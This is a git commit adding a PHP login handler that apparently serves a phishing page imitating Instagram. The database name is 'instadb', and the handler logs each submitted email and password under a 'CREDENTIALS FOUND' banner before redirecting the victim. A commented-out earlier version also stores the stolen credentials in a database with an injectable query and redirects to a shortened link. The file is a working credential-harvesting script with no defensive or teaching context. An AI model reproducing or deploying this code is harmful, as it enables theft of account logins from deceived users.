7d073d420da53bffb53b61a0765f79fc993913da
mranon0 <103735483+mranon0@users.noreply.github.com>
2022-09-04 21:36:30 +0530

    Add files via upload

---
+++ login.php
@@ -0,0 +1,22 @@
+<?php
+// $con=mysqli_connect("localhost","root","","instadb");
+// if(mysqli_connect_errno())
+// {
+//     echo "connection failed";
+//     exit();
+// }
+// else{
+//     $username=$_POST["Email"];
+//     $password=$_POST["password"];
+//     $res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
+//     error_log("$res");
+//     $sql="INSERT INTO userpass VALUES('$username','$password')";
+//     mysqli_query($con,$sql);
+//     echo "<script type='text/javascript'>window.location='https://bit.ly/3QqGwTs'</script>";
+// }
+    $username=$_POST["Email"];
+    $password=$_POST["password"];
+    $res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
+    error_log("$res");
+    echo "<script type='text/javascript'>window.location='index1.html'</script>";
+?>
